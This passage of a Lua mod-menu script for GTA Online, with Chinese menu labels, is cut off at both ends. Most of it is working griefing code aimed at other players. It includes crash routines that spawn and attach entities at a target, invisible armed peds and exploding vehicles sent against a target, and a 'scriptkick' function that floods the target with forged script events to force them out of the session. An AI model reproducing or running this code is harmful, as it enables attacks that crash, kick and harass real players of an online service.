                    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                    pos.z += 10
                    TASK.TASK_SWEEP_AIM_POSITION(ranger, "anim@mp_player_intupperstinker", "", "", "", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ranger, pos.x,pos.y,pos.z + 10)
                    entities.request_control(ranger)
                    if entities.get_owner(ranger) == pid then
                        wait(1000)
                        entitydelete_entity(ranger)
                        return
                    end
                    wait()
                end
                entitydelete_entity(ranger)
            end)
            util.create_thread(function ()
                local pos <const> = players.get_position(pid)
                pos.z = pos.z + 10
                local ranger <const> = entityspawn_entity(joaat("u_m_y_rsranger_01"), pos, 0, true, true, true, true, false)
                local time <const> = util.current_time_millis() + 5000
                while time > util.current_time_millis() do
                    local pos <const> = players.get_position(pid)
                    pos.z = pos.z + 10
                    TASK.TASK_SWEEP_AIM_ENTITY(ranger, "anim@mp_player_intupperstinker", "", "", "", -1, ranger, 0.0, 0.0)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ranger, pos.x, pos.y, pos.z)
                    entities.request_control(ranger)
                    if entities.get_owner(ranger) == pid then
                        wait(1000)
                        entitydelete_entity(ranger)
                        return
                    end
                    wait()
                end
            end)
            util.create_thread(function ()
                local weapon_ped <const> = entityspawn_entity(joaat("cs_taostranslator2"), players.get_position(pid), 0, false, false, false, false, true)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(weapon_ped, joaat("WEAPON_KNUCKLE"), 0, true)
                WEAPON.SET_PED_GADGET(weapon_ped, joaat("WEAPON_KNUCKLE"), true)
                ENTITY.SET_ENTITY_HEALTH(weapon_ped, 0)
                wait(1000)
                entitydelete_entity(weapon_ped)
            end)
        end)
        GTAC(SxMainMenu, '激流神様',{},'',function(f)
            util.create_thread(function()
            local a = 1 while a <= 5 do wait() 
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local hash = util.joaat('cs_taostranslator')
                while not STREAMING.HAS_MODEL_LOADED(hash) do
                    STREAMING.REQUEST_MODEL(hash)
                wait(5)
            end
            local ped = {}
                for i = 0, 40 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                player, 0.0, 5.0, 0.0)
                ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoords = ENTITY.GET_ENTITY_COORDS(player, false)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xDBBD7280, 0, true)
                WEAPON.SET_PED_GADGET(ped[i], 0xDBBD7280, true)
                WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(ped[i], not f, 
                false, false, false)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                    pedcoords.x, pedcoords.y, pedcoords.z,
                pedcoords.x, pedcoords.y, pedcoords.z, 0, true, 
                util.joaat("vehicle_weapon_trailer_dualaa"),players.user_ped(), true, true, 0)
                ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
                TASK.SET_HIGH_FALL_TASK(ped[i],0,0,406)
                wait(25)
            end
                wait(2500)
            for i = 0, 10 do
                entities.delete_by_handle(ped[i])
                wait(10)
            end
            a += 1
            end
            end)
            util.create_thread(function()
            local b = 1 while b <= 10 do wait() 
            local all_vehicles = entities.get_all_vehicles_as_handles()
            for i = 1, #all_vehicles do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(all_vehicles[i])
                PED.SET_PED_INTO_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 
                all_vehicles[i], 1)
                TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 
                all_vehicles[i], 33, 1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(all_vehicles[i], 
                ENTITY.GET_ENTITY_COORDS(pid).x,
                ENTITY.GET_ENTITY_COORDS(pid).y,ENTITY.GET_ENTITY_COORDS(pid).z, 
                ENTITY.GET_ENTITY_HEADING(pid))
                wait(5)
            end
            for i = 1, #all_vehicles do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(all_vehicles[i])
                PED.SET_PED_INTO_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 
                all_vehicles[i], 1)
                TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 
                all_vehicles[i], 17, 1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(all_vehicles[i], 
                ENTITY.GET_ENTITY_COORDS(pid).x,
                ENTITY.GET_ENTITY_COORDS(pid).y,ENTITY.GET_ENTITY_COORDS(pid).z+0.5, 
                ENTITY.GET_ENTITY_HEADING(pid))
                wait(5)
            end
            b += 1
            end
            end)
            util.create_thread(function()
            local c = 1 while c <= 10 do wait() 
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local pos = players.get_position(pid)
                local mdl = util.joaat("u_m_o_filmnoir")
                local veh_mdl = 788747387
                request_model(veh_mdl)
                request_model(mdl)
                    for i = 1, 10 do
                        if not players.exists(pid) then
                            return
                        end
                        local veh = entities.create_vehicle(veh_mdl, pos, 0)
                        local jesus = entities.create_ped(2, mdl, pos, 0)
                        ENTITY.SET_ENTITY_VISIBLE(jesus, false)
                        ENTITY.SET_ENTITY_VISIBLE(veh, false)
                        PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                        wait(100)
                        TASK.TASK_PLANE_LAND(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                        wait(1000)
                        entities.delete_by_handle(jesus)
                        entities.delete_by_handle(veh)
                    end  
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
            c += 1
            end
            end)
            util.create_thread(function()
            local d = 1 while d <= 10 do wait() 
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(player)
            local mdl = util.joaat("u_m_y_rsranger_01")
            local veh_mdl = util.joaat("technical2")
            request_model(veh_mdl)
            request_model(mdl)
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local ped = entities.create_ped(26, mdl, pos, 0)
            ENTITY.FREEZE_ENTITY_POSITION(veh, true)
            ENTITY.SET_ENTITY_COLLISION(veh, false)
            ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
            PED.SET_PED_INTO_VEHICLE(ped, veh, 1)
            wait(100)
            TASK.CONTROL_MOUNTED_WEAPON(ped)
            TASK.SET_MOUNTED_WEAPON_TARGET(ped, ped, 0,
            pos.x,pos.y,pos.z, 5, true)
            entities.give_control_by_handle(veh, pid)
            wait(5000)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            entities.delete_by_handle(ped)
            entities.delete_by_handle(veh)
            d += 1
            end
            end)
            util.create_thread(function()
            local e = 1 while e <= 10 do wait() 
            local pos <const> = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0, 3.0, 0.0)
            pos.x = pos.x
            pos.y = pos.y
            pos.z = pos.z + 1
            local ped_crash <const> = entities.create_ped(26,
            util.joaat("S_M_M_Janitor"), pos, 0)
            local obj_crash <const> = entities.create_object(
                util.joaat("v_ilev_gunhook"), pos,0)
            local veh_crash <const> = CreateVehicle(
                util.joaat("fixter"), pos, 0)
            PED.SET_PED_TO_RAGDOLL(ped_crash, 99999, 
            0, 0, false, false, false)
            wait(500)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_crash, ped_crash, 
            0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, 
            true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(veh_crash,
            obj_crash, 
            0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, 
            true, true, false, 0, true)
            wait(1000)
            entities.delete_by_handle(ped_crash)
            entities.delete_by_handle(obj_crash)
            entities.delete_by_handle(veh_crash)
            e += 1
            end
            end)
        end)
        GTLP(SxMainMenu, "浮世回生", {""}, "", function(on_loop)
            local mdl = util.joaat('a_c_poodle')
            local mdl1 = util.joaat('a_c_poodle')
            local mdl2 = util.joaat('a_c_poodle')
            if request_model(mdl, mdl1, mdl2, 2) then
                local pos = players.get_position(pid)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped1 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped2 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                    PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                    PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                        PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                    ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                        PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                            PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                        ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(
                            PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0)
                        local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                        WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                        local obj
                        repeat
                            obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                        until obj ~= 0 or util.yield()
                        ENTITY.DETACH_ENTITY(obj, true, true)
                        util.yield(0)
                        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                        entities.delete_by_handle(ped1)
                        util.yield(0)
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true)
                    util.yield(0)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                    entities.delete_by_handle(ped2)
                    util.yield(0)
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true)
                util.yield(0)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped2)
                util.yield(0)
            end
        end)
        GTAC(SxMainMenu, "間欲三度", {""}, "", function()
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            plauuepos.x = plauuepos.x + 5
            plauuepos.z = plauuepos.z + 5
            local hunter = {}
            for i = 1, 3 do
                for n = 0, 120 do
                    hunter[n] = CreateVehicle(0x82CAC433, plauuepos, 0)
                    util.yield(0)
                    ENTITY.FREEZE_ENTITY_POSITION(hunter[n], true)
                    util.yield(0)
                    VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
                end
                util.yield(190)
                for i = 1, #hunter do
                    if hunter[i] ~= nil then
                        entities.delete_by_handle(hunter[i])
                    end
                end
            end
            hunter = nil
            plauuepos = nil
        end)
    break
    end 
end
for _,id in ipairs(spid) do
    if name then
        HbMainMenu = GT(GTROOT, "GTVIP Pro Features ~(>.<)~", {}, "此选项允许两个相同的皇榜用户互相攻击")
        tobe = GTD(HbMainMenu, "请尽情享用")
        control_team_god2 = GTTG(HbMainMenu, "控制队友无敌", {}, "开启为给予\n关闭为移除\n此功能最好只在任务中使用 因为只控制任务内玩家\n如果队友是外挂 那么可能不起作用", function (on)
            f = on
            while f do
                for pid = 0, 4 do
                    wait()
                    pidp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    PED.SET_PED_MAX_HEALTH(pidp, 10999999)
                    ENTITY.SET_ENTITY_HEALTH(pidp, 10999999)
                    PLAYER.SET_PLAYER_MAX_ARMOUR(pidp, 10999999)
                    PED.SET_PED_ARMOUR(pidp, 10999999)
                    ENTITY.SET_ENTITY_INVINCIBLE(pidp, true)
                    PED.CLEAR_PED_BLOOD_DAMAGE(pidp)
                    ENTITY.SET_ENTITY_PROOFS(pidp, false, false, false, false, false, false, 1, false)
                end
            end
            for pid = 0, 4 do
                pidp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                PED.SET_PED_MAX_HEALTH(pidp, 328)
                ENTITY.SET_ENTITY_HEALTH(pidp, 328)
                PLAYER.SET_PLAYER_MAX_ARMOUR(pidp, 328)
                PED.SET_PED_ARMOUR(pidp, 328)
                ENTITY.SET_ENTITY_INVINCIBLE(pidp, false)
                ENTITY.SET_ENTITY_PROOFS(pidp, true, true, true, true, true, true, 1, true)
            end
        end)
        g_avenger_crash_on = false
        function avenger_crash(pid) 
            g_avenger_crash_on = true
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if ENTITY.DOES_ENTITY_EXIST(ped) then
                local hashes = {3564062519, 1890640474, 868868440}
                for _, hash in ipairs(hashes) do
                    request_model(hash)
                end
                for i = 0, 6 do
                    local ppos = ENTITY.GET_ENTITY_COORDS(ped, true)
                    ppos.y = ppos.y - 50  
                    local veh1 = spawn_vehicle(3564062519, ppos, -1)
                    local obj1 = spawn_object(1890640474, ppos, true)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(veh1, true, true)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(obj1, true, true)
                    ENTITY.SET_ENTITY_VISIBLE(veh1, true, 0)
                    ENTITY.SET_ENTITY_VISIBLE(obj1, true, 0)
                    ENTITY.SET_ENTITY_VELOCITY(veh1, 5, 3, 3)
                    ENTITY.SET_ENTITY_VELOCITY(obj1, 3, 4, 5)
                    local r_1,r_2,r_3 = math.random(1, 360),math.random(1, 360),math.random(1, 360)
                    ENTITY.SET_ENTITY_ROTATION(obj1, r_1, r_2, r_3, 0, true)
                    for j = 0, 8 do
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(veh1, obj1, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true, false, false)
                        local veh2 = spawn_vehicle(868868440, ppos, -1)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(veh2, true, true)
                        local objpos = ENTITY.GET_ENTITY_COORDS(obj1, true)
                        FIRE.ADD_EXPLOSION(objpos.x, objpos.y, objpos.z, 0, 1.0, false, true, 0.0, false)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh2, 1, 0, -100, 0, true, false, true, false)
                        ENTITY.SET_ENTITY_VISIBLE(veh2, true, 0)
                        wait(100)
                        ENTITY.DETACH_ENTITY(veh1, true, true)
                        ENTITY.DETACH_ENTITY(obj1, true, true)
                    end
                end
                g_avenger_crash_on = false
            end
        end
        HbMainMenu:action("OV2[崩溃]", {}, "鸣谢：晴天\nTITAN Menu DEV", function ()
            avenger_crash(pid)
        end)
        GTAC(HbMainMenu, "ASAP 2", {"asap2"}, "适用大多数菜单", function()
            util.create_thread(function()
                lovetop(pid)
            end)
            util.create_thread(function()
                lovemea(pid)
            end)
            util.create_thread(function()
                lovemeb(pid)
            end)
            util.create_thread(function()
                lovemec(pid)
            end)
            util.create_thread(function()
                lovemed(pid)
            end)
            util.create_thread(function()
                jingyuchiren(pid)
            end)
            util.create_thread(function()
                cuowufujia(pid)
            end)
        end)
        tcd = GTAC(HbMainMenu, "祖安花火", {"zaunfirework"}, "", function ()
            util.create_thread(function ()
                local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local allvehicles = entities.get_all_vehicles_as_handles()
                for i = 1, 3 do
                    for i = 1, #allvehicles do
                        TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                        wait()
                        TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                        wait()
                        TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                        wait()
                        TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                        wait()
                    end
                end
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
            end)
            gtoast("保持不动,等待结束")
            util.create_thread(function ()
                local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local pos = ENTITY.GET_ENTITY_COORDS(player)
                local mdl = util.joaat("u_m_y_rsranger_01")
                local veh_mdl = util.joaat("technical2")
                util.request_model(veh_mdl)
                util.request_model(mdl)
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local ped = entities.create_ped(26, mdl, pos, 0)
                ENTITY.FREEZE_ENTITY_POSITION(veh, true)
                ENTITY.SET_ENTITY_COLLISION(veh, false)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                ENTITY.SET_ENTITY_VISIBLE(veh, false)
                ENTITY.SET_ENTITY_VISIBLE(ped, false)
                PED.SET_PED_INTO_VEHICLE(ped, veh, 1)
                wait(100)
                TASK.CONTROL_MOUNTED_WEAPON(ped)
                TASK.SET_MOUNTED_WEAPON_TARGET(ped, ped, 0, pos.x,pos.y,pos.z, 5, true)
                entities.give_control_by_handle(veh, pid)
                wait(5000)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                entities.delete_by_handle(ped)
                entities.delete_by_handle(veh)
            end)
            util.create_thread(function()
                local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local c = ENTITY.GET_ENTITY_COORDS(p)
                local chop = util.joaat('cs_taostranslator')
                local chup = util.joaat('A_C_Rabbit_02')
                STREAMING.REQUEST_MODEL(chop)
                STREAMING.REQUEST_MODEL(chup)
                while not STREAMING.HAS_MODEL_LOADED(chop) do
                    STREAMING.REQUEST_MODEL(chop)
                    util.yield()
                end
                while not STREAMING.HAS_MODEL_LOADED(chup) do
                    STREAMING.REQUEST_MODEL(chup)
                    util.yield()
                end
                local achop = entities.create_ped(26, chop, c, 0)
                ENTITY.SET_ENTITY_VISIBLE(achop, false)
                WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_mg'), 9999, false, false)
                TASK.TASK_COMBAT_PED(achop, p, 0, 16)
                setAttribute(achop)
                local bchop = entities.create_ped(26, chop, c, 0)
                ENTITY.SET_ENTITY_VISIBLE(bchop, false)
                WEAPON.GIVE_WEAPON_TO_PED(bchop, util.joaat('weapon_mg'), 9999, false, false)
                TASK.TASK_COMBAT_PED(bchop, p, 0, 16)
                setAttribute(bchop)
                local cchop = entities.create_ped(26, chup, c, 0)
                WEAPON.GIVE_WEAPON_TO_PED(cchop, util.joaat('weapon_mg'), 9999, false, false)
                ENTITY.SET_ENTITY_VISIBLE(chup, false)
                ENTITY.SET_ENTITY_VISIBLE(cchop, false)
                TASK.TASK_COMBAT_PED(cchop, p, 0, 16)
                setAttribute(cchop)
                util.yield(1700)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
                util.yield(10000)
                entities.delete_by_handle(bchop)
                entities.delete_by_handle(achop)
                entities.delete_by_handle(cchop)
                if not STREAMING.HAS_MODEL_LOADED(chop) then
                    gtoast("无法加载一个崩溃模型，请重试")
                end
                gtoast("已完成")
            end)
        end)
        tcb = GTAC(HbMainMenu, "完美谢幕", {"perfectend"}, "", function ()
            gtoast("请保持不动")
            util.create_thread(function ()
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local user = PLAYER.GET_PLAYER_PED(players.user())
                local pos = ENTITY.GET_ENTITY_COORDS(ped)
                local my_pos = ENTITY.GET_ENTITY_COORDS(user)
                local anim_dict = ("anim@mp_player_intupperstinker")
                request_animation(anim_dict)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
                    util.yield(100)
                    TASK.TASK_SWEEP_AIM_POSITION(user, anim_dict, "get", "fucked", "retard", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
                    util.yield(750)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            end)
            util.create_thread(function ()
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local pos = players.get_position(pid)
                local mdl = util.joaat("mp_m_freemode_01")
                local veh_mdl = util.joaat("powersurge")
                util.request_model(veh_mdl)
                util.request_model(mdl)
                for i = 1, 10 do
                    if not players.exists(pid) then
                        return
                    end
                    local veh = entities.create_vehicle(veh_mdl, pos, 0)
                    local jesus = entities.create_ped(2, mdl, pos, 0)
                    ENTITY.SET_ENTITY_VISIBLE(veh, false)
                    ENTITY.SET_ENTITY_VISIBLE(jesus, false)
                    PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                    util.yield(100)
                    TASK.TASK_SUBMARINE_GOTO_AND_STOP(1, veh, pos.x, pos.y, pos.z, 1)
                    util.yield(1000)
                    entities.delete_by_handle(jesus)
                    entities.delete_by_handle(veh)
                end
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
                gtoast("已完成")
            end)
        end)
        tcr = GTAC(HbMainMenu, "戏命师", {}, "我于杀戮之中绽放\n亦如黎明中的花朵", function()
            STREAMING.REQUEST_MODEL(0x78BC1A3C)
            STREAMING.REQUEST_MODEL(0x15F27762)
            STREAMING.REQUEST_MODEL(0x0E512E79)
            for i = 0, 10 do
            local allpeds = entities.get_all_peds_as_handles()
            local allvehicles = entities.get_all_vehicles_as_handles()
            local allobjects = entities.get_all_objects_as_handles()
            local ownped = players.user_ped(players.user())
            local vehicle_1=CreateVehicle(0x78BC1A3C, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).z, true, false)
            local vehicle_2=CreateVehicle(0x15F27762, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).z, true, false)
            local vehicle_3=CreateVehicle(0x0E512E79, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).z, true, false)
            for i = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle_1, i) - 1
                VEHICLE.SET_VEHICLE_MOD(vehicle_1, i, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(vehicle_1, mod, true)
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle_2, i) - 1
                VEHICLE.SET_VEHICLE_MOD(vehicle_2, i, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(vehicle_2, mod, true)
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle_3, i) - 1
                VEHICLE.SET_VEHICLE_MOD(vehicle_3, i, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(vehicle_3, mod, true)
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle_4, i) - 1
                VEHICLE.SET_VEHICLE_MOD(vehicle_4, i, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(vehicle_4, mod, true)
            end
            for i = 1, #allpeds do
                if allpeds[i] ~= ownped then
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allpeds[i], ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).x,ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).y,ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).z)
                end
            end
            for i = 1, #allvehicles do
                if allvehicles[i] ~= ownvehicle then
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allvehicles[i], ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).x,ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).y,ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).z)
                    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(allvehicles[i],1)
                    VEHICLE.SET_TAXI_LIGHTS(allvehicles[i])
                end
            end
            for i = 1, #allobjects do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allobjects[i], ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).x,ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).y,ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)).z)
            end
            wait(400)
            end
            PED.RESURRECT_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        end)
    break
    end
end
PlayerMainMenu2 = GT(GTROOT, "踢出选项", {"GTKick"}, "赤诚相见,别来无恙", function()
    local focused = players.get_focused()
    if #focused > 0 and menu.is_open() and (players.get_spectate_target(players.user()) ~= focused[1]) then
        local pid = focused[1]
        if pid ~= cur_focused_player then
            if not cur ~= 0 then
                entities.delete(cur)
            end
            cur_focused_player = pid
        end
        local name = PLAYER.GET_PLAYER_NAME(pid)
        for _, id in ipairs(spid) do
            if name == id.playerid then
                gtoast("你无法对皇榜用户使用任何攻击功能")
                menu.trigger_commands("GTProt" .. name)
            end
        end
    end
end)
function scriptkick(pid)
    util.trigger_script_event(1 << pid ,{ -642704387, players.user(), 0, 782258655, math.random(-2147483646, 2147483646), 1, 0, 0, 0, 0, 0, pid, 
    players.user(), math.random(-2147483646, 2147483646), math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{-1013606569, players.user(),0})
    util.trigger_script_event(1 << pid ,{-1091407522, players.user(),0, 1, math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{-1101672680, players.user(),0})
    util.trigger_script_event(1 << pid ,{-1544003568, players.user(),0})
    util.trigger_script_event(1 << pid ,{-1547064369, players.user(),0, 0, 2147483646})
    util.trigger_script_event(1 << pid ,{-1604421397, players.user(),0})
    util.trigger_script_event(1 << pid ,{-1638522928, players.user(),0, math.random(-2147483646, 2147483646), 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, -1})
    util.trigger_script_event(1 << pid ,{-1713699293, players.user(),0})
    util.trigger_script_event(1 << pid ,{-1852117343, players.user(),0})
    util.trigger_script_event(1 << pid ,{-1986344798, players.user(),0, math.random(-2147483646, 2147483646), 0, 0})
    util.trigger_script_event(1 << pid ,{-2026172248, players.user(),0, 0, 0, 0, 1})
    util.trigger_script_event(1 << pid ,{-2051197492, players.user(),0})
    util.trigger_script_event(1 << pid ,{-2102799478, players.user(),0})
    util.trigger_script_event(1 << pid ,{-2122488865, players.user(),0, 0, 2147483646})
    util.trigger_script_event(1 << pid ,{-353458099, players.user(),0})
    util.trigger_script_event(1 << pid ,{-445044249, players.user(),0, 28, -1, -1})
    util.trigger_script_event(1 << pid ,{-69240130, players.user(),0, 0, 0, math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{-800312339, players.user(),0, 0, math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{-901348601, players.user(),0, -1520562907})
    util.trigger_script_event(1 << pid ,{1214811719, players.user(),0, 1, 1, 1, math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{1269949700, players.user(),0, 0, 2147483646})
    util.trigger_script_event(1 << pid ,{1318264045, players.user(),0, 0, 0, 0, math.random(-2147483646, 2147483646), 0, 0})
    util.trigger_script_event(1 << pid ,{1450115979, players.user(),0})
    util.trigger_script_event(1 << pid ,{1504695802, players.user(),0, math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{1638329709, players.user(),0, 0, math.random(-2147483646, 2147483646), 0, 0})
    util.trigger_script_event(1 << pid ,{1925046697, players.user(),0, math.random(-2147483646, 2147483646), 1})
    util.trigger_script_event(1 << pid ,{1932558939, players.user(),0, 0, math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{1980857009, players.user(),0})
    util.trigger_script_event(1 << pid ,{2079562891, players.user(),0, 0, math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{446749111, players.user(),0, math.random(-2147483646, 2147483646), 0})
    util.trigger_script_event(1 << pid ,{623462469, players.user(),0})
